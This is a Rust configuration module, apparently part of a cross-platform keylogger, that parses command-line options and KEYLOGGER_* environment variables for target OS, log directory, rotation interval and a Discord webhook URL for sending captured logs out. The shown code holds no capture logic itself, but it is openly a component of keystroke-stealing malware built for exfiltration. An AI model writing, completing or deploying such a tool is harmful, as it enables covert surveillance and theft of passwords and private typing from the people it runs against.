use clap::Parser;
use std::env;
use std::time::Duration;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
pub struct Cli {
    #[arg(short = 's', long, help = "Operating system (linux, windows, mac)")]
    pub os: String,

    #[arg(short = 'o', long, help = "Directory to save log files")]
    pub output: Option<String>,

    #[arg(short = 'd', long, help = "Log rotation interval in seconds")]
    pub duration: Option<u64>,

    #[arg(short = 'w', long, help = "Discord webhook URL for sending logs")]
    pub webhook: Option<String>,
}

pub struct Config {
    pub os: String,
    pub output_dir: String,
    pub duration: Duration,
    pub webhook_url: Option<String>,
}

impl Config {
    pub fn new() -> Self {
        let cli = Cli::parse();

        let output_dir = cli
            .output
            .or_else(|| env::var("KEYLOGGER_OUTPUT").ok())
            .unwrap_or_else(|| "logs".into());

        let duration = cli
            .duration
            .or_else(|| {
                env::var("KEYLOGGER_DURATION")
                    .ok()
                    .and_then(|s| s.parse().ok())
            })
            .unwrap_or(3600);

        let webhook_url = cli.webhook.or_else(|| env::var("KEYLOGGER_WEBHOOK").ok());

        Self {
            os: cli.os,
            output_dir,
            duration: Duration::from_secs(duration),
            webhook_url,
        }
    }
}
